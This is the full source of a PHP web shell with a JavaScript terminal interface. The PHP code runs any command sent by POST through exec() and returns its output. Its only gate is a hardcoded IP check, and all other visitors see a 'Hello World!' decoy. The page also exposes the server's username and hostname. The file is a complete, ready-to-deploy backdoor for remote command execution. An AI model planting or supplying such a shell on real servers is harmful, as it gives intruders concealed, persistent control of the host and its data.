<?php
/**
 * @author:             jRimbault
 * @date:               2017-07-13
 * @last modified date: 2017-07-18
 *
 * @note: remote shell via php and ajax
 */

if ($_SERVER['REMOTE_ADDR'] !== '78.194.50.40') die('Hello World!');

if (isset($_POST['command'])) {
    header('Content-Type: application/json');

    $json['status'] = 0;
    $json['output'] = PHP_EOL;

    if (trim($_POST['command']) != '') {
        exec(trim($_POST['command']).' 2>&1', $output, $retval);

        $json['status'] = $retval;

        foreach ($output as $line) {
            $json['output'] .= $line.PHP_EOL;
        }
    }

    echo json_encode($json);
    exit(0);
}

?>
<!doctype html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Remote Shell</title>

<style type="text/css">
    html, body {
        margin: 0;
        padding: 0;
        background-color: #222222;
        color: #dddddd;
    }
    div#output {
        margin: 1em;
        font-family: monospace;
        white-space: pre;
        line-height: 1.1em;
    }
    input {
        width: 500px;
        background-color: #222222;
        color: #ffffff;
        border: none;
        outline: none;
        margin: 0;
        padding: 0;
        font-family: monospace;
        font-size: .98em;
    }
    input:active, input:focus,
    input:enabled, input,
    input:-webkit-autofill:active, input:-webkit-autofill:focus,
    input:-webkit-autofill:enabled, input:-webkit-autofill {
        background: #222222;
        color: #ffffff;
        border: none;
        outline: none;
        -webkit-box-shadow: 0 0 0 30px #222222 inset;
        -webkit-text-fill-color: #ffffff !important;
    }
    .prompt {
        font-weight: 600;
        color: #00ff00;
    }
    .dir {
        font-weight: 600;
        color: #4284F4;
    }
    .dir:before {
        content: ':';
        color: #dddddd;
    }
    .dir:after {
        content: '$ ';
        color: #dddddd;
    }
    .hide {
        display: none;
    }
    #overlay {
        position: fixed;
        top: 0;
        left: 0;
        visibility: hidden;
        overflow: auto;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        background: #dddddd;
    }
</style>

<script>
    'use strict'

    /**
     * Helper functions/aliases
     */
    const $ = {
        el:  s => document.querySelector(s),
        els: s => [].slice.call(document.querySelectorAll(s) || []),
        li: (s,f) => document.addEventListener(s, f),
        ce:  s => document.createElement(s),
    }

    /**
     * Alias for quickly replacing DOM nodes
     */
    function replaceNode(oldNode, newNode) {
        oldNode.parentNode.replaceChild(newNode, oldNode)
    }

    /**
     * Ajax helper, if called without 'data' it will do a GET,
     * if called with 'data' it will do a POST.
     *
     * @param  string   url      path to request
     * @param  Function callback function handling the JSON.parse(responseText)
     * @param  object   data     simple object similar to a named indexed array
     */
    function ajax(url, callback, data) {
        let params;
        let request = new XMLHttpRequest();

        request.open((data ? 'POST' : 'GET'), url);

        request.onreadystatechange = function() {
            if (request.readyState > 3 && request.status === 200) {
                callback(JSON.parse(request.responseText));
            }
        };

        if (data) {
            request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            params = typeof data == 'string' ? data : Object.keys(data).map((k) => {
                return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]);
            }).join('&');
        }

        request.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        request.send(params);

        return request;
    }

    /**
     * Rules of the overlay drawn over the screen
     */
    class Overlay {
        constructor() {
            this.overlay = $.el('#overlay')
            this.beep = new Audio("data:audio/wav;base64,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 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=")
        }
        /**
         * Switch the overlay's visibility
         */
        visible() {
            this.overlay.style.visibility = this.overlay.style.visibility == 'visible' ? 'hidden' : 'visible'
        }
        /**
         * Flash the screen with the overlay and emit a beep
         *
         * @param  integer m number of frames of the flash (roughly)
         */
        blink(m = 1) {
            this.beep.play()
            this.visible()
            setTimeout(this.visible, 20*m)
        }
    }

    /**
     * Prompt class
     * Interact with the DOM to draw the user prompt
     */
    class Prompt {
        constructor() {
            this.username = $.el('#username').innerHTML
            this.hostname = $.el('#hostname').innerHTML
            this.output   = $.el('#output')
            this.buildPrompt()
            this.prompt()
            this.buildInput()
            this.input()
            $.li('keydown', this.focus)
        }
        /**
         * Build the prompt DOM
         * Store it in a private variable
         */
        buildPrompt() {
            let line = $.ce('span')
            line.setAttribute('class', 'prompt')
            line.innerHTML = this.username+'@'+this.hostname

            let dir = $.ce('span')
            dir.setAttribute('class', 'dir')
            dir.innerHTML = '~'
            line.append(dir)

            this.line = line
        }
        /**
         * Add a prompt to the existing DOM
         */
        prompt() {
            this.output.append(this.line)
        }
        /**
         * Build the input box
         * Store it in a private variable
         */
        buildInput() {
            let input = $.ce('input')
            input.setAttribute('type', 'text')
            input.setAttribute('id', 'input')

            this.box = input
        }
        /**
         * Add a new input box to the DOM
         */
        input() {
            this.box.value = ''
            this.output.append(this.box)
        }
        /**
         * Keep the input box in focus
         */
        focus() {
            $.el('#input').focus()
        }
        /**
         * Replace the previous input box by simple text of last
         * command
         * Appends the new prompt and input box to the DOM
         *
         * @param  string value of the last command
         */
        updatePrompt(value) {
            let input = $.el('#input')
            let text  = $.ce('span')
            text.innerHTML = value
            replaceNode(input, text)
            this.prompt()
            this.input()
        }
    }

    /**
     * Interaction with the localStorage
     */
    class History {
        constructor() {
            this.count = localStorage.length
        }
        /**
         * Sends a new value to localStorage
         *
         * @param  string value to store
         */
        toStorage(value) {
            if (value == '') return
            localStorage.setItem(localStorage.length, value)
            this.count = localStorage.length
        }
        /**
         * Get a value from the localStorage
         *
         * @param  integer i    key to access item
         * @param  string  item current input value
         *
         * @return string       localStorage value
         */
        fromStorage(i, item) {
            if (i === -1 && this.count === -1) return ''
            if (i === 1 && this.count === localStorage.length) return ''
            return localStorage.getItem(this.counter(i))
        }
        /**
         * Preferred method for interacting with the counter
         *
         * @param  integer i -1 or 1
         *
         * @return integer   new value of the counter
         */
        counter(i) {
            this.count = this.count + i
            if (this.count < 0) this.count = -1
            if (this.count >= localStorage.length) this.count = localStorage.length
            return this.count
        }
        /**
         * Return a formatted string of all the user's history
         *
         * @return string
         */
        full() {
            let output = '\n'
            for (let i = 0; i < localStorage.length; i++) {
                output += i+1+'\t'+localStorage.getItem(i)+'\n'
            }
            return output
        }
        erase() {
            localStorage.clear()
        }
    }

    /**
     * Define the shell behavior
     */
    class Shell {
        constructor(prompt, history, overlay) {
            this.prompt  = prompt
            this.history = history
            this.overlay = overlay
            this.output  = $.el('#output')
            this.setInput()
            this.bindMethods()
            $.li('keydown', this.keyboard)
        }
        /**
         * Bind all the methods to `this` object. If we don't do
         * this, some methods will use the `this` of the
         * `XMLHttpRequest` or `Event`
         */
        bindMethods() {
            this.keyboard = this.keyboard.bind(this)
            this.builtins = this.builtins.bind(this)
            this.command  = this.command.bind(this)
            this.print    = this.print.bind(this)
            this.checkReturn = this.checkReturn.bind(this)
        }
        /**
         * Builtins commands:
         * Commands defined client-side
         *  - `Return key`: prints a new line
         *  - `clear`: clear the screen
         *  - `history`: show the user's history of commands
         *  - `help`: show an help text
         *
         * Default case is to execute the command server-side
         */
        builtins() {
            switch (this.input.value) {
                case '':
                    this.print('\n')
                    break
                case 'clear':
                    this.clear()
                    break
                case 'history':
                    this.printHistory()
                    break
                case 'erase':
                    this.eraseHistory()
                    break
                case 'help':
                    this.help()
                    break
                default:
                    this.command()
                    break
            }
        }
        /**
         * Clear the screen, set up a new prompt, blink the overlay
         */
        clear() {
            this.output.innerHTML = ''
            this.prompt.prompt()
            this.prompt.input()
            this.setInput()
            this.overlay.blink()
        }
        eraseHistory() {
            this.history.erase()
            this.print('\n');
        }
        /**
         * Print the user's history onscreen
         */
        printHistory() {
            this.print(this.history.full())
        }
        /**
         * Help message
         */
        help() {
            let help = '\n'
            help += "try `echo $PATH | sed 's/:/\\n/g'` to give you an idea of what you can do\n"
            help += "build-ins:\n"
            help += "    help     show this help\n"
            help += "    history  show your history\n"
            help += "    erase    erase your history\n"
            help += "    clear    clear the screen\n"
            this.print(help)
        }
        /**
         * Send the command to the server and add the command to
         * the local history
         */
        command() {
            let data = {
                command: this.input.value
            }
            ajax(window.location.href, this.checkReturn, data)
            this.history.toStorage(this.input.value)
        }
        /**
         * Checks the return value of the server, blink the screen
         * in case of error
         *
         * @param  JSON json from the server
         */
        checkReturn(json) {
            if (json.status) this.overlay.blink()
            this.print(json.output)
        }
        /**
         * Print the text the server returned, setup a new prompt,
         * scroll to the bottom
         *
         * @param  string text [description]
         */
        print(text) {
            this.output.innerHTML += text
            this.prompt.updatePrompt(this.input.value)
            this.setInput()
            window.scrollTo(0,document.body.scrollHeight);
        }
        /**
         * Reselect the input each time a new prompt is drawn and
         * the previous one erased
         */
        setInput() {
            this.input = $.el('#input')
        }
        previousCommand() {
            this.input.value = this.history.fromStorage(-1, this.input.value)
        }
        nextCommand() {
            this.input.value = this.history.fromStorage(1, this.input.value)
        }
        /**
         * Blink the screen if input is empty
         */
        empty() {
            if (this.input.value === '') this.overlay.blink()
        }
        /**
         * Listens for keyboard events and sends them to the
         * appropriate function
         *
         * @param  Event event keydown
         */
        keyboard(event) {
            let code = event.keyCode
            switch (code) {
                // Up Arrow
                case 38:
                    event.preventDefault()
                    this.previousCommand()
                    break
                // Down Arrow
                case 40:
                    event.preventDefault()
                    this.nextCommand()
                    break
                // Enter
                case 13:
                    event.preventDefault()
                    this.builtins()
                    break
                case 8:
                    this.empty()
                    break
                // Control
                case 17:
                    event.preventDefault()
                    break
                default:
                    break
            }
        }
    }
</script>

<p id="username" class="hide"><?= posix_getpwuid(posix_geteuid())['name'] ?></p>
<p id="hostname" class="hide"><?= gethostname() ?></p>

<div id="output"></div>
<div id="overlay"></div>

<script>
    const overlay = new Overlay()
    const prompt = new Prompt()
    const history = new History()
    const shell = new Shell(prompt, history, overlay)
</script>
